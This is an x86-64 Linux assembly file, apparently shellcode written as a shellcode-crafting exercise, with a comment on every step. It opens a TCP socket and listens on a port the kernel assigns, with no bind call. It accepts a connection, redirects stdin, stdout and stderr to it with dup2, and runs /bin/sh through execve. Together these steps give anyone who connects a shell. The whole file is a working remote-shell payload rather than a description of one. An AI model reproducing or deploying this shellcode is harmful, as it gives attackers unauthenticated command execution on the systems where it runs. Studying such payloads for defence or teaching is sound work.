
global _start

section .text

_start:
	; Avoiding garbage
	; Putting zero in three registers (rax, rdx and rsi), search about mul instruction for understanding

	xor rsi, rsi		; zeroing rsi
	mul rsi			; zeroing rax and rdx at cost of one xor (3 bytes)

	; syscalls (/usr/include/asm/unistd_64.h)
	; socket numbers (/usr/include/linux/net.h)

	; Creating the socket file descriptor
	; int socket(int domain, int type, int protocol);
	; socket(AF_INET, SOCK_STREAM, IPPROTO_IP)

	; socket arguments (bits/socket.h, netinet/in.h)

				; IPPROTO_IP = 0 (int) - rdx is already zero

	inc esi			; SOCK_STREAM = 1 (int)

	push 2			; AF_INET = 2 (int)
	pop rdi

	mov al, 41		; syscall 41 - socket
	syscall			; kernel interruption


	; Preparing to listen the incoming connection (passive socket)
	; int listen(int sockfd, int backlog);
	; listen(sockfd, int);

	; listen arguments
	push rdx		; put zero into rsi
	pop rsi

	push rax		; put the file descriptor returned by socket() into rdi
	pop rdi

	mov al, 50		; syscall 50 - listen
	syscall			; kernel interruption


	; Accepting the incoming connection
	; int accept(int sockfd, struct sockaddr *addr, socklen_t *addrlen);
	; accept(sockfd, NULL, NULL)

	; accept arguments	; here we need only do nothing, the rdi already contains the sockfd,
				; likewise rsi and rdx contains 0

        mov al, 43		; syscall 43 - accept
	syscall			; kernel interruption


	; Creating a interchangeably copy of the 3 file descriptors (stdin, stdout, stderr)
	; int dup2(int oldfd, int newfd);
	; dup2(clientfd, ...)

	push rdi		; push the sockfd integer to use as the loop counter (rsi)
	pop rsi

	xchg rdi, rax		; put the clientfd returned from accept into rdi

dup_loop:
	dec esi			; decrement loop counter

	mov al, 33		; syscall 33 - dup2
	syscall			; kernel interruption

	jnz dup_loop


	; Finally, using execve to substitute the actual process with /bin/sh
	; int execve(const char *filename, char *const argv[], char *const envp[]);
	; exevcve("/bin/sh", NULL, NULL)

	; execve string argument
					; *envp[] rdx is already NULL
					; *argv[] rsi is already NULL
	push rdx			; put NULL terminating string
	mov rdi, 0x68732f6e69622f2f	; "//bin/sh"
	push rdi			; push /bin/sh string
	push rsp			; push the stack pointer
	pop rdi				; pop it (string address) into rdi

	mov al, 59			; execve syscall
	syscall				; bingo